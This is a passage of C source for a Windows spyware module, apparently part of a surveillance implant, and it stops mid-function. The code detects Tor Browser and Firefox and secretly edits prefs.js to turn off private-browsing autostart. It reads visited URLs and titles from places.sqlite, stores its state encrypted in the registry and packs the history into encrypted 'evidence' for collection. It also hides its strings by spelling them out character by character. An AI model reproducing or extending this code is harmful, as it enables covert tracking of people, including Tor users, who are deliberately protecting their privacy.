#include "url.h"
#include <stdio.h>
#include <time.h>
#include "globals.h"
#include "version.h"
#include "utils.h"
#include "zmem.h"
#include "proto.h"

#ifndef _GLOBAL_VERSION_FUNCTIONS_
	#define _GLOBAL_VERSION_FUNCTIONS_
	#include "version.h"
#endif

#define CHECK_INTERVAL 60000 //interval to check for new evidences

sqlite3 *g_ppDb  = NULL;
//char	*g_szErr = NULL;

BROWSER_DATA g_pBrowserData[URL_MAX_BROWSER];
URL_LOGS	 g_lpURLLogs[MAX_URL_QUEUE];


//url main function
VOID URL_Main()
{	
	int	nRet = 0;
	
	while(TRUE)
	{
		#ifdef _DEBUG
		OutputDebugString(L"[URL] Thread running...\r\n");
		#endif

		//verify thread existence
		if(bURLThread == FALSE)
		{
			#ifdef _DEBUG
			OutputDebugString(L"[URL] Thread not found...\r\n");
			#endif		

			hURLThread = NULL;
			return;
		}

		if(bCollectEvidences)
		{
			#ifdef _DEBUG
			OutputDebugString(L"[URL] Collecting evidences\r\n");
			#endif

			//verify if the tor db has already been found
			nRet = URL_GetSavedInfo((PBROWSER_DATA*)g_pBrowserData);
			if(nRet == 0)
				return;

			#ifdef _DEBUG
			OutputDebugString(L"[URL] Getting Tor Browser\r\n");
			#endif

			//get the tor history
			URL_GetBrowserHistory(BROWSER_TOR);

			#ifdef _DEBUG
			OutputDebugString(L"[URL] Getting Firefox Browser\r\n");
			#endif

			//get the firefox history
			URL_GetBrowserHistory(BROWSER_FIREFOX);
		}

		#ifdef _DEBUG
		OutputDebugString(L"[URL] Thread sleeping...\r\n");
		#endif

		//sleep for the specified of time
		Sleep(CHECK_INTERVAL);
	}
}


//get the web site history of the specified browser
int URL_GetBrowserHistory(BROWSER_TYPE Browser)
{
	PBROWSER_DATA pBrowserData = NULL;
	WCHAR	wsTorExe[]		= {L't', L'o', L'r', L'.', L'e', L'x', L'e', L'\0'};
	WCHAR	wsFirefoxExe[]	= {L'f', L'i', L'r', L'e', L'f', L'o', L'x', L'.', L'e', L'x', L'e', L'\0'};
	LPWSTR	lpwsExe=NULL, lpwsExePath=NULL;
	DWORD	dwProcID=0, dwLen=0;
	int		nRet, nStartFrom=0;
	BOOL	bRet;

	switch(Browser)
	{
		case BROWSER_TOR:
			dwLen = wcslen(wsTorExe) + 1;
			lpwsExe = (LPWSTR)malloc(dwLen * sizeof(WCHAR));
			if(lpwsExe != NULL)
				wcscpy_s(lpwsExe, dwLen, wsTorExe);
		break;

		case BROWSER_FIREFOX:
			dwLen = wcslen(wsFirefoxExe) + 1;
			lpwsExe = (LPWSTR)malloc(dwLen * sizeof(WCHAR));
			if(lpwsExe != NULL)
				wcscpy_s(lpwsExe, dwLen, wsFirefoxExe);
		break;

		default:
			return 0;
	}

	if(lpwsExe == NULL)
		return 0;

	//get the registry info for the specified browser
	nStartFrom = 0;

	//search for a running process
	dwProcID = URL_IsProcess(lpwsExe);
	znfree((LPVOID*)&lpwsExe);

	if(dwProcID)
	{
		//get the process full path
		lpwsExePath = URL_GetProcessPath(dwProcID);
		if(lpwsExePath == NULL)
			return 0;
	}

	do
	{
		//get browser info
		pBrowserData = URL_FindBrowserInfo((PBROWSER_DATA*)g_pBrowserData, lpwsExePath, Browser, &nStartFrom);
		if(pBrowserData == NULL)
		{
			//if no browser info id found and the process is not running then exit
			if(dwProcID == 0)
			{
				znfree((LPVOID*)&lpwsExePath);
				return 0;
			}

			//search the browser files
			bRet = URL_SearchFiles(lpwsExePath, &pBrowserData, Browser);
			znfree((LPVOID*)&lpwsExePath);
			if(bRet == FALSE)
				return 0;
		}

		#ifdef _DEBUG
		OutputDebugString(L"[URL] Browser info found");
		OutputDebugStringA(pBrowserData->ConfigPath);
		OutputDebugStringA(pBrowserData->DBPath);
		#endif

		//check if the config file path is present in the saved configuration
		if((pBrowserData->ConfigPath[0] != 0) && (dwProcID == 0))
		{
			//modify the browser's configuration file
			nRet = URL_ModifyConfigFile(pBrowserData);
			if(!nRet)
				return 0;

			//delete the configuration information
			//memset(pBrowserData->ConfigPath, 0x0, sizeof(pBrowserData->ConfigPath));
			//URL_SaveInfo(g_pBrowserData);
		}

		//check if the db is present in the current configuration
		if(pBrowserData->DBPath[0] != 0)
		{
			//query the database to extract urls
			URL_GetHistory(pBrowserData);
		}

		dwProcID = 0;
	}
	while(nStartFrom < URL_MAX_BROWSER);

	return 0;
}


//open the tor db containing the visited sites (places.sqlite)
int URL_OpenDB(LPSTR lpDBPath)
{
	int nRet;

	//apertura del db
	nRet = sqlite3_open(lpDBPath, &g_ppDb);

	return nRet;
}


//query the db for visited websites
int URL_GetHistory(PBROWSER_DATA pBrowserData)
{
	char szSQLQuery[] = "select * from moz_places m inner join moz_historyvisits h \
					    on m.id = h.place_id \
					    where h.visit_date > %s \
					    order by h.id";
	LPSTR lpszQry = NULL;
	DWORD dwSize = 0;
	char  *lpszErr = NULL;
	int   nRet;

	switch(pBrowserData->Type)
	{
		case BROWSER_FIREFOX:
		case BROWSER_TOR:

			//open the firefox and tor db
			if(URL_OpenDB(pBrowserData->DBPath) != SQLITE_OK)
			{
				#ifdef _DEBUG
				OutputDebugString(L"[URL] OpenDB failed");
				#endif

				return SQLITE_ERROR;
			}

			if(pBrowserData->TimeStamp[0] == 0)
				pBrowserData->TimeStamp[0] = '0';

			dwSize = strlen(szSQLQuery) + strlen(pBrowserData->TimeStamp) + 1;

			//concatenate the query
			lpszQry = (LPSTR)malloc(dwSize);
			if(lpszQry == NULL)
			{
				sqlite3_close(g_ppDb);
				return SQLITE_ERROR;
			}
			sprintf_s(lpszQry, dwSize, szSQLQuery, pBrowserData->TimeStamp);

			//query the db
			nRet = sqlite3_exec(g_ppDb, lpszQry, URL_GetHistoryCallback, pBrowserData, &lpszErr);
			free(lpszQry);
			if(lpszErr != NULL)
				sqlite3_free(lpszErr);			

			//close the db connection
			sqlite3_close(g_ppDb);

			//if there were no errors or the log array was full, then proceed
			if((nRet != SQLITE_OK) && (nRet != SQLITE_ABORT))
			{
				#ifdef _DEBUG
				OutputDebugString(L"[URL] sqlite3_exec failed");
				#endif				

				return SQLITE_ERROR;
			}

			//save the registry array
			if(!URL_SaveInfo(g_pBrowserData))
				return SQLITE_ERROR;
		break;

		default:
			return SQLITE_ERROR;
	}

	return SQLITE_OK;
}


//history callback function called for every row returned
int URL_GetHistoryCallback(void* pParams, int nCol, char** sRows, char** sColumnName)
{
	LPWSTR lpwsURL=NULL, lpwsTitle=NULL;
	LPSTR  lpszTimestamp=NULL;
	DWORD  dwSize;
	int    nErr=0;
	PBROWSER_DATA p = (PBROWSER_DATA)pParams;

	for(int i = 0; i < nCol; i++)
	{
		if(sColumnName[i] == NULL)
			continue;

		if(sRows[i] == NULL)
			continue;

		if(!_stricmp(sColumnName[i], "url"))
		{
			dwSize = strlen(sRows[i]) + 1;
			lpwsURL = (LPWSTR)malloc(dwSize * sizeof(WCHAR));
			if(lpwsURL == NULL)
			{
				nErr = -1;
				break;
			}

			swprintf_s(lpwsURL, dwSize, L"%S", sRows[i]);
			continue;
		}

		if(!_stricmp(sColumnName[i], "title"))
		{
			dwSize = strlen(sRows[i]) + 1;
			lpwsTitle = (LPWSTR)malloc(dwSize * sizeof(WCHAR));
			if(lpwsTitle == NULL)
			{
				nErr = -1;
				break;
			}

			swprintf_s(lpwsTitle, dwSize, L"%S", sRows[i]);
			continue;
		}

		if(!_stricmp(sColumnName[i], "last_visit_date"))
		{
			dwSize = strlen(sRows[i]) + 1;
			lpszTimestamp = (LPSTR)malloc(dwSize);
			if(lpszTimestamp == NULL)
			{
				nErr = -1;
				break;
			}

			sprintf_s(lpszTimestamp, dwSize, "%s", sRows[i]);
			continue;
		}
	}

	//check if there were errors
	if(nErr == 0)
	{
		if(lpwsURL != NULL)
		{
			if(lpwsTitle == NULL)
			{			
				lpwsTitle = (LPWSTR)malloc(4*sizeof(WCHAR));
				if(lpwsTitle == NULL)
				{
					znfree((LPVOID*)&lpwsURL);
					znfree((LPVOID*)&lpszTimestamp);
					return 1;
				}

				wcscpy_s(lpwsTitle, 4, L" \0");
			}

			if(lpszTimestamp == NULL)
			{			
				lpszTimestamp = (LPSTR)malloc(4*sizeof(WCHAR));
				if(lpszTimestamp == NULL)
				{
					znfree((LPVOID*)&lpwsURL);
					znfree((LPVOID*)&lpwsTitle);
					return 1;
				}

				strcpy_s(lpszTimestamp, 4, "0\0");
			}

			//log the url data
			if(URL_LogEvidence(lpwsURL, lpwsTitle, lpszTimestamp, (BROWSER_TYPE)p->Type))
			{
				//save the timestamp of the last url
				memset(p->TimeStamp, 0, sizeof(p->TimeStamp));
				sprintf_s(p->TimeStamp, sizeof(p->TimeStamp), "%s", lpszTimestamp);

				#ifdef _DEBUG
				OutputDebugString(L"[URL] Logging evidendce");
				OutputDebugString(lpwsURL);
				#endif
			}
			else
				nErr = 1; //error, log full
		}
	}

	//free the allocated memory
	znfree((LPVOID*)&lpwsURL);
	znfree((LPVOID*)&lpwsTitle);
	znfree((LPVOID*)&lpszTimestamp);

	return nErr;
}


//search in the global browser array, the data of the specified browser type
PBROWSER_DATA URL_FindBrowserInfo(PBROWSER_DATA *pBrowserData, LPWSTR lpExePath, BROWSER_TYPE Browser, int *nStartFrom)
{	
	PBROWSER_DATA p = NULL;
	LPSTR	lpszExe = NULL;
	DWORD	dwSize = 0;
	size_t	dwConv;
	BOOL	bFound = FALSE;
	int i;
	
	p = (PBROWSER_DATA)pBrowserData;

	if(lpExePath)
	{
		dwSize = wcslen(lpExePath) + 1;

		//alloc mem for the char string
		lpszExe = (LPSTR)malloc(dwSize);
		if(lpszExe == NULL)
			return NULL;
		
		//convert wchar array to multi-byte array
		if(wcstombs_s(&dwConv, lpszExe, dwSize, lpExePath, dwSize))
		{
			znfree((LPVOID*)&lpszExe);
			return NULL;
		}
	}

	#ifdef _DEBUG
	WCHAR wcBuf[1024];
	#endif

	for(i = *nStartFrom; (i < URL_MAX_BROWSER) && (p[i].Type != BROWSER_UNKNOWN); i++)
	{
		#ifdef _DEBUG
		OutputDebugString(L"FindBrowserInfo loop:");
		_swprintf(wcBuf, L"%d\nExe: %S\nDB: %S\nCfg: %S\n", i, p[i].ExePath, p[i].DBPath, p[i].ConfigPath);
		OutputDebugString(wcBuf);
		#endif

		if(p[i].Type == (char)Browser)
		{
			if(lpExePath != NULL)
			{
				//verify the exe path (there could be multiple tor installations on the same pc)
				if(!_stricmp(p[i].ExePath, lpszExe))
				{
					bFound = TRUE;
					break;
				}
			}
			else
			{
				bFound = TRUE;
				break;
			}
		}
	}

	znfree((LPVOID*)&lpszExe);

	if(bFound == TRUE)
	{		
		*nStartFrom = i + 1;
		return &p[i];
	}
	else
		*nStartFrom = URL_MAX_BROWSER + 1;	

	return NULL;
}


//verify if the browser process is running and return the process id
DWORD URL_IsProcess(LPWSTR lpwsExeName)
{
	PROCESSENTRY32 ppe;
	HANDLE hSnapshot = NULL;
	BOOL   bRet, bFound = FALSE;

	//create a snapshot of the running processes
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if(hSnapshot == INVALID_HANDLE_VALUE)
	{
		#ifdef _DEBUG
		OutputDebugString(L"[URL] CreateToolhelp32Snapshot failed");
		#endif

		return 0;
	}

	ppe.dwSize = sizeof(PROCESSENTRY32);

	//get the first process
	bRet = Process32First(hSnapshot, &ppe);
	if(bRet == FALSE)
	{
		#ifdef _DEBUG
		OutputDebugString(L"[URL] Process32First failed");
		#endif

		CloseHandle(hSnapshot);
		return 0;
	}

	do
	{
		//verify the name of the process
		if(!_wcsicmp(ppe.szExeFile, lpwsExeName))
		{
			bFound = TRUE;
			continue;
		}

		//search the next process
		bRet = Process32Next(hSnapshot, &ppe);
		if(bRet == FALSE)
			break;

	}while((bRet == TRUE) && (bFound == FALSE));

	//close the snapshot
	CloseHandle(hSnapshot);

	if(bFound == FALSE)
	{
		#ifdef _DEBUG
		OutputDebugString(L"[URL] Browser process not found");
		OutputDebugString(lpwsExeName);
		#endif

		return 0;
	}
	
	return ppe.th32ProcessID;
}


//get the full path of the browser exe from the running process
LPWSTR URL_GetProcessPath(DWORD dwProcID)
{
	MODULEENTRY32  pme;
	HANDLE hSnapshot = NULL;
	BOOL   bRet, bFound = FALSE;

	//create a snapshot for the running process
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, dwProcID);
	if(hSnapshot == INVALID_HANDLE_VALUE)
	{
		#ifdef _DEBUG
		OutputDebugString(L"[URL] CreateToolhelp32Snapshot failed");
		#endif

		return NULL;
	}

	pme.dwSize = sizeof(MODULEENTRY32);

	//get the first process
	bRet = Module32First(hSnapshot, &pme);
	if(bRet == FALSE)
	{
		#ifdef _DEBUG
		OutputDebugString(L"[URL] Module32First failed");
		#endif

		CloseHandle(hSnapshot);
		return NULL;
	}

	CloseHandle(hSnapshot);

	if(pme.szExePath == NULL)
		return NULL;

	LPWSTR lpwsPath = NULL;
	DWORD  dwSize = 0;

	dwSize = wcslen(pme.szExePath) + 1;

	lpwsPath = (LPWSTR)malloc(dwSize * sizeof(WCHAR));
	if(lpwsPath != NULL)		
		wcscpy_s(lpwsPath, dwSize, pme.szExePath);

	return lpwsPath;
}


//get the first free array position
int GetFirstFreePos(PBROWSER_DATA pBrowserData)
{
	int i;	

	for(i=0; i<URL_MAX_BROWSER; i++, pBrowserData++)
	{
		if(pBrowserData->Type == BROWSER_UNKNOWN)
			break;
	}

	if(i >= URL_MAX_BROWSER)
		return -1;

	return i;
}



//modify the browser's configuration file
int URL_ModifyConfigFile(PBROWSER_DATA pBrowserData)
{
	CHAR	szConfigStr[] = {'u', 's', 'e', 'r', '_', 'p', 'r', 'e', 'f', '(', '"', 'b', 'r', 'o', 'w', 's', 'e', 'r', '.', 'p',  'r',  'i',  'v',  'a',  't',  'e',  'b',  'r',  'o',  'w',  's',  'i',  'n',  'g',  '.',  'a',  'u',  't',  'o',  's',  't',  'a',  'r',  't',  '"',  ',',  ' ',  'f',  'a',  'l',  's',  'e', ')',  ';', '\r', '\n', '\0'};
	CHAR    szSubStr[]    = {'b', 'r', 'o', 'w', 's', 'e', 'r', '.', 'p',  'r',  'i',  'v',  'a',  't',  'e',  'b',  'r',  'o',  'w',  's',  'i',  'n',  'g',  '.',  'a',  'u',  't',  'o',  's',  't',  'a',  'r',  't', '\0'};
	LPSTR	lpszConfigPath = NULL;
	LPSTR   lpszBuf = NULL;
	DWORD	dwWr;
	BOOL	bRet = FALSE;
	HANDLE	hFile = NULL;
	DWORD	dwSize = 0;


	switch(pBrowserData->Type)
	{
		case BROWSER_FIREFOX:
		case BROWSER_TOR:			

			dwSize = strlen(pBrowserData->ConfigPath) + 1;
			lpszConfigPath = (LPSTR)malloc(dwSize);
			if(lpszConfigPath == NULL)
				return 0;
			sprintf_s(lpszConfigPath, dwSize, "%s", pBrowserData->ConfigPath); 

			#ifdef _DEBUG
			OutputDebugString(L"Modifying config file");
			OutputDebugStringA(lpszConfigPath);
			#endif			

			//open the config file
			hFile = CreateFileA(lpszConfigPath, GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
			free(lpszConfigPath);

			if(hFile == INVALID_HANDLE_VALUE)				
				return 0;			
			
			//search in the file for the config string
			lpszBuf = File_SearchString(hFile, szSubStr);
			if(lpszBuf != NULL)
			{
				//verify if the correct string is already present
				if(strstr(lpszBuf, "false"))
				{
					CloseHandle(hFile);
					znfree((LPVOID*)&lpszBuf);
					return 1;
				}
				znfree((LPVOID*)&lpszBuf);
			}

			//set the file pointer to the end of the file
			if(SetFilePointer(hFile, 0, 0, FILE_END) == INVALID_SET_FILE_POINTER)
			{
				CloseHandle(hFile);
				return 0;
			}

			#ifdef _DEBUG
			OutputDebugString(L"Writing config file");			
			#endif

			//write the file
			bRet = WriteFile(hFile, szConfigStr, strlen(szConfigStr) + 1, &dwWr, NULL);
			CloseHandle(hFile);

			if(bRet != TRUE)
				return 0;
		break;

		default:
			return 0;
	}

	#ifdef _DEBUG
	OutputDebugString(L"Writing config file ok");
	#endif

	return 1;
}


//search the places.sqlite db and the config file starting from the exe name
BOOL URL_SearchFiles(LPWSTR lpwsExePath, PBROWSER_DATA* pBrowserData, BROWSER_TYPE Browser)
{	
	WCHAR   wsConfigFile[] = {L'p', L'r', L'e', L'f', L's', L'.', L'j', L's', L'\0'};
	WCHAR   wsDBFile[]     = {L'p', L'l', L'a', L'c', L'e', L's', L'.', L's', L'q', L'l', L'i', L't', L'e', L'\0'};
	LPWSTR	lpwsConfigDir = NULL, lpwsDBDir = NULL, lpwsPath = NULL;	
	size_t	dwConv;
	int		nRet;
	BROWSER_DATA BrowserData;

	SecureZeroMemory(&BrowserData, sizeof(BROWSER_DATA));

	switch(Browser)
	{
		case BROWSER_TOR:
		case BROWSER_FIREFOX:
					
			if(Browser == BROWSER_TOR)
			{
				//moves up 2 directories
				lpwsPath = GetParentDirectory(lpwsExePath, 2);
			}
			else
			{
				WCHAR wsSubDir[] = {L'M', L'o', L'z', L'i', L'l', L'l', L'a', L'\\', L'F', L'i', L'r', L'e', L'f', L'o', L'x', L'\0'};

				//get the appdata directory
				lpwsPath = GetAppDataDirectory(wsSubDir);
			}

			if(lpwsPath == NULL)
				return FALSE;

			//save the exe path
			if(lpwsExePath != NULL)
			{					
				if(wcstombs_s(&dwConv, BrowserData.ExePath, sizeof(BrowserData.ExePath), lpwsExePath, _TRUNCATE))
				{
					free(lpwsPath);
					return NULL;
				}
			}

			//search the configuration file
			lpwsConfigDir = SearchFile(lpwsPath, wsConfigFile);
			if(lpwsConfigDir == NULL)
			{
				#ifdef _DEBUG
				OutputDebugString(L"[URL] Config file not found\r\n");
				OutputDebugString(lpwsExePath);
				#endif

				free(lpwsPath);
				return FALSE;
			}

			#ifdef _DEBUG
			OutputDebugString(L"[URL] Config file found in directory");
			OutputDebugString(lpwsConfigDir);
			#endif
	
			//save the configuration file path
			BrowserData.Type = (char)Browser;
			wcstombs_s(&dwConv, BrowserData.ConfigPath, sizeof(BrowserData.ConfigPath), lpwsConfigDir, _TRUNCATE);
			free(lpwsConfigDir);

			//search the db file
			lpwsDBDir = SearchFile(lpwsPath, wsDBFile);
			if(lpwsDBDir == NULL)
			{
				#ifdef _DEBUG
				OutputDebugString(L"[URL] DB file not found\r\n");
				OutputDebugString(lpwsExePath);
				#endif

				free(lpwsPath);
				return FALSE;
			}

			#ifdef _DEBUG
			OutputDebugString(L"[URL] Config file found in directory");
			OutputDebugString(lpwsDBDir);
			#endif

			//save the db file path
			wcstombs_s(&dwConv, BrowserData.DBPath, sizeof(BrowserData.DBPath), lpwsDBDir, _TRUNCATE);			

			free(lpwsPath);
			free(lpwsDBDir);

		break;

		default:
			return FALSE;
	}	

	//save the browser data in the global array
	nRet = URL_AddSavedInfo((PBROWSER_DATA)g_pBrowserData, &BrowserData);
	if(nRet < 0)
		return FALSE;
	
	*pBrowserData = &g_pBrowserData[nRet];

	return TRUE;
}


//search a file starting from the specified directory
LPWSTR SearchFile(LPWSTR lpwsPath, LPWSTR lpwsFile)
{
	WIN32_FIND_DATA FindFileData;
	HANDLE	hFile = NULL;
	BOOL	bRet = TRUE;
	LPWSTR	lpwsFoundPath = NULL;
	LPWSTR	lpwsCompletePath = NULL;
	DWORD	dwLen = 0;

	if((lpwsPath == NULL) || (lpwsFile == NULL))
		return NULL;

	lpwsCompletePath = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR));
	if(lpwsCompletePath == NULL)
		return NULL;
	swprintf_s(lpwsCompletePath, MAX_PATH, L"%s\\%s", lpwsPath, lpwsFile);
	
	//search for the specified file
	hFile = FindFirstFile(lpwsCompletePath, &FindFileData);
	if(hFile != INVALID_HANDLE_VALUE)
	{
		free(lpwsCompletePath);
		lpwsFoundPath = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR));
		if(lpwsFoundPath != NULL)
			swprintf_s(lpwsFoundPath, MAX_PATH, L"%s\\%s", lpwsPath, FindFileData.cFileName);

		FindClose(hFile);
		return lpwsFoundPath;
	}

	if(lpwsFile[0] != '*')
	{
		swprintf_s(lpwsCompletePath, MAX_PATH, L"%s\\%s", lpwsPath, L"*");

		hFile = FindFirstFile(lpwsCompletePath, &FindFileData);
		if(hFile == INVALID_HANDLE_VALUE)
		{
			free(lpwsCompletePath);
			return NULL;
		}
	}

	//search a directory in the current path
	do
	{
		bRet = FindNextFile(hFile, &FindFileData);
		if(!bRet)
			continue;

		//skip special file name
		if(!wcscmp(FindFileData.cFileName, L".") || !wcscmp(FindFileData.cFileName, L".."))
			continue;

		//if it's a file, continue
		if((FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != FILE_ATTRIBUTE_DIRECTORY)
			continue;

		//if it's a directory, add it to the path
		swprintf_s(lpwsCompletePath, MAX_PATH, L"%s\\%s", lpwsPath, FindFileData.cFileName);
		#ifdef _DEBUG
		OutputDebugString(L"[URL] Searching file in directory\r\n");
		OutputDebugString(lpwsCompletePath);
		#endif

		//recursion
		lpwsFoundPath = SearchFile(lpwsCompletePath, lpwsFile);
		if(lpwsFoundPath != NULL)
			break;
	}
	while(bRet == TRUE);

	//close the file handle
	FindClose(hFile);

	//free memory
	znfree((LPVOID*)&lpwsCompletePath);

	return lpwsFoundPath;
}


//get the path of the parent directory
LPWSTR GetParentDirectory(LPWSTR lpwsPath, int nLevels)
{
	WCHAR  *lpwsOrigPath = NULL, *lpwsPos = NULL, *lpTmpPath = NULL;
	LPWSTR lpwsParent = NULL;
	DWORD  dwSize = 0;

	if(lpwsPath == NULL)
		return NULL;

	lpwsOrigPath = lpwsPath;

	//search the filepath till the last \ char
	for(int i=0; i<nLevels+1; i++)
	{		
		lpTmpPath = lpwsOrigPath;
		do
		{
			lpwsPos  = wcschr(lpTmpPath, L'\\');
			if(lpwsPos != NULL)
				lpTmpPath = lpwsPos+1;
		}
		while(lpwsPos != NULL);

		if(lpTmpPath == NULL)
		{
			#ifdef _DEBUG
			OutputDebugString(L"[URL] GetParentDirectory failed");
			OutputDebugString(lpwsPath);
			#endif

			znfree((LPVOID*)&lpwsParent);
			return NULL;
		}
		else if((lpwsParent != NULL) && (!wcscmp(lpTmpPath, lpwsParent)))
		{			
			return lpwsParent;
		}
		else if(!wcscmp(lpTmpPath, lpwsOrigPath))
		{
			//no parent directory found, return the search directory
			return lpwsOrigPath;
		}

		dwSize = wcslen(lpwsOrigPath) - wcslen(lpTmpPath);
		
		znfree((LPVOID*)&lpwsParent);

		lpwsParent = (LPWSTR)malloc(dwSize * sizeof(WCHAR));
		if(lpwsParent == NULL)
			return NULL;
		wcsncpy_s(lpwsParent, dwSize, lpwsPath, _TRUNCATE);

		lpwsOrigPath = lpwsParent;
	}

	return lpwsParent;
}


//get the %appdata% directory + specified subdir
LPWSTR GetAppDataDirectory(LPWSTR lpwsSubDir)
{
	LPWSTR lpwsAppData = NULL;	
		
	lpwsAppData = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR));
	if(lpwsAppData == NULL)
		return NULL;

	if(!SHGetSpecialFolderPath(NULL, lpwsAppData, CSIDL_APPDATA, FALSE))
	{
		znfree((LPVOID*)&lpwsAppData);
		return NULL;
	}

	if(lpwsSubDir != NULL)
	{		
		DWORD dwSize = wcslen(lpwsAppData) + wcslen(lpwsSubDir) + 1;

		//verify the length
		if(dwSize >= MAX_PATH)
		{
			znfree((LPVOID*)&lpwsAppData);
			return NULL;
		}

		wcscat_s(lpwsAppData, MAX_PATH, L"\\");
		wcscat_s(lpwsAppData, MAX_PATH, lpwsSubDir);
	}

	return lpwsAppData;
}


//read saved browser information from the registry
int URL_GetSavedInfo(PBROWSER_DATA *pBrowserData)
{
	HKEY hKey;
	WCHAR wsBase[] = SOLDIER_REGISTRY_KEY;
	WCHAR wsData[] = URL_REGISTRY_BROWSER_DATA;
	DWORD dwRet=0, dwOut=0;
	BOOL  bRet;
	
	if(pBrowserData == NULL)
		return 0;

	SecureZeroMemory(pBrowserData, sizeof(BROWSER_DATA) * URL_MAX_BROWSER);
	
	LPWSTR lpwsUnique = GetScoutSharedMemoryName();
	LPWSTR lpwsSubKey = (LPWSTR)malloc(512 * sizeof(WCHAR));

	if((lpwsUnique == NULL) || (lpwsSubKey == NULL))
	{
		znfree((LPVOID*)&lpwsUnique);
		znfree((LPVOID*)&lpwsSubKey);
		return 0;
	}

	_snwprintf_s(lpwsSubKey, 512, _TRUNCATE, L"%s\\%s", wsBase, lpwsUnique);
	bRet = CreateRegistryKey(HKEY_CURRENT_USER, lpwsSubKey, REG_OPTION_NON_VOLATILE, KEY_READ|KEY_WRITE, &hKey);

	//free memory
	znfree((LPVOID*)&lpwsUnique);
	znfree((LPVOID*)&lpwsSubKey);

	if(bRet == FALSE)
		return 0;
	
	//get the browser data
	dwOut = sizeof(BROWSER_DATA) * URL_MAX_BROWSER;
	dwRet = RegQueryValueEx(hKey, wsData, NULL, NULL, (LPBYTE)pBrowserData, &dwOut);
	//close the registry key
	RegCloseKey(hKey);

	if((dwRet != ERROR_SUCCESS) && (dwRet != ERROR_FILE_NOT_FOUND))
		return 0;

	//decrypt the key value
	if(dwRet != ERROR_FILE_NOT_FOUND)		
		DecryptBuffer((LPBYTE)pBrowserData, sizeof(BROWSER_DATA) * URL_MAX_BROWSER);

	return 1;
}


//add an item to the array of the browser structure
int URL_AddSavedInfo(PBROWSER_DATA pArray, PBROWSER_DATA pBrowserData, int nPos/*=-1*/)
{

	if(nPos >= URL_MAX_BROWSER)
		return -1;

	if(pArray == NULL)
		return -1;

	if(nPos == -1)
	{
		//get the first free position in the array
		nPos = GetFirstFreePos(pArray);
		if(nPos < 0)
			return -1;
	}

	//copy the data into the array
	memcpy(&pArray[nPos], pBrowserData, sizeof(BROWSER_DATA));

	//save the structure
	URL_SaveInfo(pArray);

	return nPos;
}


//save browser info in the registry
int URL_SaveInfo(PBROWSER_DATA pBrowserData)
{
	HKEY hKey;
	WCHAR wsBase[]	= SOLDIER_REGISTRY_KEY;
	WCHAR wsData[]	= URL_REGISTRY_BROWSER_DATA;
	DWORD dwRet = 0;
	BOOL  bRet = FALSE;

	LPWSTR lpwsUnique = GetScoutSharedMemoryName();
	LPWSTR strSubKey = (LPWSTR)malloc(512 * sizeof(WCHAR));
	
	if((lpwsUnique == NULL) || (strSubKey == NULL))
	{
		znfree((LPVOID*)&lpwsUnique);
		znfree((LPVOID*)&strSubKey);
		return 0;
	}
	
	//registry subkey
	_snwprintf_s(strSubKey, 512, _TRUNCATE, L"%s\\%s", wsBase, lpwsUnique);

	bRet = CreateRegistryKey(HKEY_CURRENT_USER, strSubKey, REG_OPTION_NON_VOLATILE, KEY_READ|KEY_WRITE, &hKey);

	znfree((LPVOID*)&lpwsUnique);
	znfree((LPVOID*)&strSubKey);

	if(bRet == FALSE)
		return 0;

	//encrypt the key value
	EncryptBuffer((LPBYTE)pBrowserData, sizeof(BROWSER_DATA) * URL_MAX_BROWSER);

	//write the registry key
	dwRet = RegSetValueEx(hKey, wsData, 0, REG_BINARY, (LPBYTE)pBrowserData, sizeof(BROWSER_DATA) * URL_MAX_BROWSER);	
	RegCloseKey(hKey);

	DecryptBuffer((LPBYTE)pBrowserData, sizeof(BROWSER_DATA) * URL_MAX_BROWSER);

	if(dwRet != ERROR_SUCCESS)
		return 0;

	return 1;
}


// scrive un a entry nel file di log corrispondente
BOOL URL_LogEvidence(LPWSTR lpwsURL, LPWSTR lpwsTitle, LPSTR lpszTimestamp, BROWSER_TYPE Browser)
{	
	DWORD dwDelimiter = ELEM_DELIMITER;
	DWORD dwLogVer = URL_LOG_VER;
	DWORD dwSize;
	LPBYTE lpcBuf, lpTmp;
	struct tm time;
	_int64 nTime;
	BOOL   bRet = FALSE;
	char   szBuf[32];

	//verify the log info
	if((lpwsURL == NULL) || (lpwsTitle == NULL) || (lpszTimestamp == NULL))
		return FALSE;

	//build the log	

	//get the system time
	//_time64(&nTime);	

	strcpy_s(szBuf, sizeof(szBuf), lpszTimestamp);
	szBuf[10] = 0;
	nTime = atol(szBuf);
	//convert time value to a tm struct
	_gmtime64_s(&time, &nTime);
	time.tm_year += 1900;
	time.tm_mon++;

	//compute the size of the log
	dwSize  = sizeof(time);									//timestamp
	dwSize += sizeof(dwLogVer);								//log_version
	dwSize += ((wcslen(lpwsURL) + 1) * sizeof(WCHAR));		//url
	dwSize += sizeof(Browser);								//browser type
	dwSize += ((wcslen(lpwsTitle) + 1) * sizeof(WCHAR));	//title
	dwSize += sizeof(dwDelimiter);							//delimiter

	//alloc mem for the log data
	lpcBuf = (LPBYTE)malloc(dwSize);
	if(lpcBuf == NULL)
		return FALSE;
	lpTmp = lpcBuf;

	//fill the buffer
	memcpy(lpTmp, &time, sizeof(time));
	lpTmp += sizeof(time);
	memcpy(lpTmp, &dwLogVer, sizeof(dwLogVer));
	lpTmp += sizeof(dwLogVer);
	memcpy(lpTmp, lpwsURL, ((wcslen(lpwsURL) + 1) * sizeof(WCHAR)));
	lpTmp += ((wcslen(lpwsURL) + 1) * sizeof(WCHAR));
	memcpy(lpTmp, &Browser, sizeof(Browser));
	lpTmp += sizeof(Browser);
	memcpy(lpTmp, lpwsTitle, ((wcslen(lpwsTitle) + 1) * sizeof(WCHAR)));
	lpTmp += ((wcslen(lpwsTitle) + 1) * sizeof(WCHAR));
	memcpy(lpTmp, &dwDelimiter, sizeof(dwDelimiter));

	//add to the log queue
	DWORD dwEvSize;
	LPBYTE lpcEvBuffer = PackEncryptEvidence(dwSize, lpcBuf, PM_URLAGENT, NULL, 0, &dwEvSize);
	znfree((LPVOID*)&lpcBuf);

	//queue the evidence
	bRet = URL_QueueLog(lpcEvBuffer, dwEvSize);
